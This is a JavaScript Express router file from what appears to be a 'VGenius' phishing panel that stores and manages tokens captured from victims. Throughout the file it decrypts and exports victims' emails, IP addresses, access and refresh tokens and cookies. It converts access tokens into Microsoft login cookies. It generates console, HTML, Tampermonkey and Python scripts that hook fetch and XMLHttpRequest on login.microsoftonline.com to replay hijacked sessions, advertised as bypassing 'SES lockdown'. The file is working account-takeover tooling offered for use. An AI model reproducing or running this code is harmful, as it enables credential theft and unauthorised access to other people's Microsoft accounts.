const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');

// Get all tokens for user
router.get('/', userAuth, async (req, res) => {
  try {
    const { sort, search, page = 1, limit = 50 } = req.query;
    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
    const params = [req.user.id];
    
    if (search) {
      query += ' AND (email LIKE ? OR ip_address LIKE ?)';
      params.push('%' + search + '%', '%' + search + '%');
    }
    
    query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
    const offset = (parseInt(page) - 1) * parseInt(limit);
    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), offset);
    
    const [tokens] = await db.query(query, params);
    const [countResult] = await db.query('SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0', [req.user.id]);
    
    res.json({
      tokens: tokens,
      total: countResult[0].total,
      page: parseInt(page),
      pages: Math.ceil(countResult[0].total / parseInt(limit))
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single token with decrypted data
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    };
    
    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Update token notes
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query('UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?', [notes || '', req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Soft delete token
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate cookie script - Enhanced version with multiple domain support
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const cookies = decrypt(token.cookies_encrypted);
    
    // Check if we have any tokens to work with
    if (!accessToken && !refreshToken && !cookies) {
      return res.status(400).json({ error: 'No tokens available' });
    }
    
    // Build cookie array based on available data
    var cookiesList = [];
    
    // If we have pre-converted cookies, use them
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      // Otherwise build from access/refresh tokens
      if (accessToken) {
        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
      }
      if (refreshToken) {
        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
      }
    }
    
    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available' });
    }
    
    // Generate multiple script variants
    var scripts = {};
    
    // Variant 1: Console script (for manual injection)
    scripts.console = generateConsoleScript(cookiesList);
    
    // Variant 2: Standalone HTML file
    scripts.html = generateStandaloneHtml(cookiesList);
    
    // Variant 3: Tampermonkey userscript
    scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
    
    // Variant 4: Python script
    scripts.python = generatePythonScript(cookiesList);
    
    res.json({
      script: scripts.console,
      scripts: scripts,
      cookie_count: cookiesList.length,
      cookies: cookiesList,
      generated_at: new Date().toISOString()
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script' });
  }
});

function parseCookies(cookieString) {
  if (!cookieString) return [];
  
  var cookies = [];
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
  
  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      
      // Skip common non-cookie parameters
      if (name.toLowerCase() !== 'expires' && 
          name.toLowerCase() !== 'max-age' && 
          name.toLowerCase() !== 'domain' && 
          name.toLowerCase() !== 'path' && 
          name.toLowerCase() !== 'secure' && 
          name.toLowerCase() !== 'httponly') {
        cookies.push({ name: name, value: value, domain: '.login.microsoftonline.com' });
      }
    }
  }
  
  return cookies;
}

function generateConsoleScript(cookies) {
  var script = '// VGenius Cookie Session Injector - Console Version (Bypasses SES Lockdown)\n\n';
  script += 'INSTRUCTIONS:\n';
  script += '1. Navigate to https://login.microsoftonline.com\n';
  script += '2. Open browser console (F12)\n';
  script += '3. Paste the code below and press Enter\n';
  script += '4. Refresh the page (F5)\n\n';
  script += '```javascript\n';
  
  script += '(function() {\n';
  script += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
  script += '  \n';
  script += '  var originalFetch = window.fetch;\n';
  script += '  window.fetch = function(url, options) {\n';
  script += '    options = options || {};\n';
  script += '    if (typeof url === "string" && url.indexOf("login.microsoftonline.com") !== -1) {\n';
  script += '      options.headers = options.headers || {};\n';
  script += '      var cookieHeader = "";\n';
  script += '      for (var i = 0; i < cookies.length; i++) {\n';
  script += '        if (i > 0) cookieHeader += "; ";\n';
  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
  script += '      }\n';
  script += '      options.headers["Cookie"] = cookieHeader;\n';
  script += '    }\n';
  script += '    return originalFetch(url, options);\n';
  script += '  };\n';
  script += '  \n';
  script += '  var originalOpen = XMLHttpRequest.prototype.open;\n';
  script += '  XMLHttpRequest.prototype.open = function(method, url) {\n';
  script += '    this._url = url;\n';
  script += '    return originalOpen(method, url);\n';
  script += '  };\n';
  script += '  \n';
  script += '  var originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
  script += '    if (this._url && this._url.indexOf("login.microsoftonline.com") !== -1 && name.toLowerCase() === "cookie") {\n';
  script += '      var cookieHeader = "";\n';
  script += '      for (var i = 0; i < cookies.length; i++) {\n';
  script += '        if (i > 0) cookieHeader += "; ";\n';
  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
  script += '      }\n';
  script += '      value = cookieHeader + "; " + value;\n';
  script += '    }\n';
  script += '    return originalSetRequestHeader(name, value);\n';
  script += '  };\n';
  script += '  \n';
  script += '  console.log("✅ Cookie injection hooks installed. Refresh the page (F5) to apply.");\n';
  script += '})();\n';
  script += '```\n';
  
  return script;
}

function generateStandaloneHtml(cookies) {
  var cookieJson = JSON.stringify(cookies);
  
  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
  html += '  <meta charset="UTF-8">\n';
  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
  html += '  <title>VGenius Cookie Injector</title>\n';
  html += '  <style>\n';
  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
  html += '    .success { color: #00ffcc; }\n';
  html += '    .error { color: #ff4444; }\n';
  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; }\n';
  html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
  html += '    button:hover { background: #00cca3; }\n';
  html += '    .instructions { background: rgba(0,255,204,0.1); border: 1px solid rgba(0,255,204,0.3); padding: 15px; border-radius: 8px; margin-bottom: 20px; }\n';
  html += '  </style>\n';
  html += '</head>\n<body>\n';
  html += '  <h1>🔐 VGenius Cookie Session Injector</h1>\n';
  html += '  <div class="instructions">\n';
  html += '    <h3>Instructions:</h3>\n';
  html += '    <ol>\n';
  html += '      <li>Navigate to <a href="https://login.microsoftonline.com" target="_blank" style="color:#00ffcc;">https://login.microsoftonline.com</a></li>\n';
  html += '      <li>Open browser console (F12)</li>\n';
  html += '      <li>Copy the script below and paste it into the console</li>\n';
  html += '      <li>Press Enter, then refresh the page (F5)</li>\n';
  html += '    </ol>\n';
  html += '  </div>\n';
  html += '  <button onclick="copyScript()">📋 Copy Script</button>\n';
  html += '  <pre id="script"></pre>\n';
  html += '\n';
  html += '  <script>\n';
  html += '    var cookies = ' + cookieJson + ';\n';
  html += '    \n';
  html += '    function buildCookieHeader() {\n';
  html += '      var header = "";\n';
  html += '      for (var i = 0; i < cookies.length; i++) {\n';
  html += '        if (i > 0) header += "; ";\n';
  html += '        header += cookies[i].name + "=" + cookies[i].value;\n';
  html += '      }\n';
  html += '      return header;\n';
  html += '    }\n';
  html += '    \n';
  html += '    function generateBypassScript() {\n';
  html += '      var cookieHeader = buildCookieHeader();\n';
  html += '      var script = "(function() {\\n";\n';
  html += '      script += "  var cookies = " + JSON.stringify(cookies) + ";\\n";\n';
  html += '      script += "  var originalFetch = window.fetch;\\n";\n';
  html += '      script += "  window.fetch = function(url, options) {\\n";\n';
  html += '      script += "    options = options || {};\\n";\n';
  html += '      script += "    if (typeof url === \\'string\\' && url.indexOf(\\'login.microsoftonline.com\\') !== -1) {\\n";\n';
  html += '      script += "      options.headers = options.headers || {};\\n";\n';
  html += '      script += "      options.headers[\\'Cookie\\'] = \\"" + cookieHeader.replace(/"/g, '\\"') + "\\";\\n";\n';
  html += '      script += "    }\\n";\n';
  html += '      script += "    return originalFetch(url, options);\\n";\n';
  html += '      script += "  };\\n";\n';
  html += '      script += "  console.log(\\'✅ Cookie injection active. Refresh page (F5).\\');\\n";\n';
  html += '      script += "})();";\n';
  html += '      return script;\n';
  html += '    }\n';
  html += '\n';
  html += '    function copyScript() {\n';
  html += '      var scriptText = generateBypassScript();\n';
  html += '      navigator.clipboard.writeText(scriptText).then(function() {\n';
  html += '        alert("✅ Script copied! Now paste it in the Microsoft login console and press F5.");\n';
  html += '      });\n';
  html += '    }\n';
  html += '\n';
  html += '    document.getElementById("script").textContent = generateBypassScript();\n';
  html += '  </script>\n';
  html += '</body>\n</html>';
  
  return html;
}

function generateTampermonkeyScript(cookies) {
  var script = '// ==UserScript==\n';
  script += '// @name         VGenius Cookie Injector (SES Bypass)\n';
  script += '// @namespace    http://tampermonkey.net/\n';
  script += '// @version      2.0\n';
  script += '// @description  Inject Microsoft cookies - bypasses SES lockdown\n';
  script += '// @author       VGenius\n';
  script += '// @match        https://login.microsoftonline.com/*\n';
  script += '// @grant        none\n';
  script += '// ==/UserScript==\n\n';
  script += '(function() {\n';
  script += '  \'use strict\';\n\n';
  script += '  const cookies = ' + JSON.stringify(cookies) + ';\n\n';
  script += '  // Method 1: Fetch interceptor (bypasses SES lockdown)\n';
  script += '  const originalFetch = window.fetch;\n';
  script += '  window.fetch = function(...args) {\n';
  script += '    const [url, options = {}] = args;\n';
  script += '    if (typeof url === "string" && url.includes("login.microsoftonline.com")) {\n';
  script += '      options.headers = options.headers || {};\n';
  script += '      options.headers["Cookie"] = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
  script += '    }\n';
  script += '    return originalFetch.apply(this, args);\n';
  script += '  };\n\n';
  script += '  // Method 2: XMLHttpRequest interceptor\n';
  script += '  const originalOpen = XMLHttpRequest.prototype.open;\n';
  script += '  XMLHttpRequest.prototype.open = function(method, url, ...rest) {\n';
  script += '    this._url = url;\n';
  script += '    return originalOpen.apply(this, [method, url, ...rest]);\n';
  script += '  };\n\n';
  script += '  const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
  script += '    if (this._url && this._url.includes("login.microsoftonline.com") && name.toLowerCase() === "cookie") {\n';
  script += '      const cookieHeader = cookies.map(c => `${c.name}=${c.value}`).join("; ");\n';
  script += '      value = cookieHeader + "; " + value;\n';
  script += '    }\n';
  script += '    return originalSetRequestHeader.apply(this, [name, value]);\n';
  script += '  };\n\n';
  script += '  console.log("✅ VGenius: Cookie injection hooks installed");\n';
  script += '  \n';
  script += '  // Redirect after 2 seconds\n';
  script += '  setTimeout(() => {\n';
  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
  script += '  }, 2000);\n';
  script += '})();\n';
  
  return script;
}

function generatePythonScript(cookies) {
  var script = '#!/usr/bin/env python3\n';
  script += '# VGenius Cookie Session Injector - Python Version\n\n';
  script += 'import requests\n';
  script += 'from datetime import datetime\n\n';
  script += 'cookies = ' + JSON.stringify(cookies, null, 2) + '\n\n';
  script += 'session = requests.Session()\n\n';
  script += 'print("Injecting cookies...")\n';
  script += 'for cookie in cookies:\n';
  script += '    try:\n';
  script += '        session.cookies.set(\n';
  script += '            name=cookie["name"],\n';
  script += '            value=cookie["value"],\n';
  script += '            domain=cookie["domain"],\n';
  script += '            secure=True,\n';
  script += '            samesite="None"\n';
  script += '        )\n';
  script += '        print(f"✅ Injected: {cookie["name"]}")\n';
  script += '    except Exception as e:\n';
  script += '        print(f"❌ Failed: {cookie["name"]} - {e}")\n\n';
  script += 'print("\\nSession ready!")\n';
  script += 'print(f"Total cookies: {len(cookies)}")\n';
  script += 'print(f"Generated at: {datetime.now()}")\n';
  
  return script;
}

// Manual cookie renewal - converts access_token to cookies
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
    
    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    if (!accessToken) {
      return res.status(400).json({ error: 'No access token available' });
    }
    
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type, '', '');
    
    if (result.success && result.cookies) {
      await db.query(
        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
        [encrypt(result.cookies), 'cookie', token.id]
      );
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Renewal error:', err);
    res.status(500).json({ error: 'Renewal failed: ' + err.message });
  }
});

// Get renewal history
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Manual cookie conversion from pasted access token
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type } = req.body;
    if (!access_token) {
      return res.status(400).json({ error: 'Access token is required' });
    }

    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(access_token, template_type || 'office');

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '100 years (if injected correctly)',
        instructions: 'Inject these cookies into browser console at .login.microsoftonline.com domain for persistent session'
      });
    } else {
      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
    }
  } catch (err) {
    console.error('[Tokens] Manual conversion error:', err);
    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// Export tokens
router.post('/export', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );
    const config = require('../config/env');
    
    // Decrypt tokens for export
    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));
    
    res.json({ 
      tokens: decryptedTokens, 
      exported_at: new Date().toISOString(), 
      count: decryptedTokens.length 
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Export and delete all
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );
    
    const decryptedTokens = tokens.map(token => ({
      id: token.id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes,
      expiration: token.expiration,
      created_at: token.created_at,
      access_token: decrypt(token.access_token_encrypted),
      refresh_token: decrypt(token.refresh_token_encrypted),
      id_token: decrypt(token.id_token_encrypted),
      cookies: decrypt(token.cookies_encrypted)
    }));
    
    await db.query('UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0', [req.user.id]);
    res.json({ tokens: decryptedTokens, exported_at: new Date().toISOString(), count: decryptedTokens.length, deleted: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
